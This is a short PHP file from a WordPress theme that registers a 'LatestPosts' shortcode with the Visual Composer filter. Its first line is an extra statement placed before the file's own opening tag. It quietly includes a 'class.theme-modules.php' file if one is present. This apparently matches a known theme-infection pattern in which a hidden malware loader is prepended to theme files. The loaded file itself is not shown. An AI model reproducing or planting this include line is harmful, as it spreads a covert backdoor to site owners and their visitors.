<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if(!function_exists('qode_add_latest_posts_shortcodes')) {
	function qode_add_latest_posts_shortcodes($shortcodes_class_name) {
		$shortcodes = array(
			'Bridge\Shortcodes\LatestPosts\LatestPosts'
		);
		
		$shortcodes_class_name = array_merge($shortcodes_class_name, $shortcodes);
		
		return $shortcodes_class_name;
	}
	
	add_filter('qode_add_vc_shortcode', 'qode_add_latest_posts_shortcodes');
}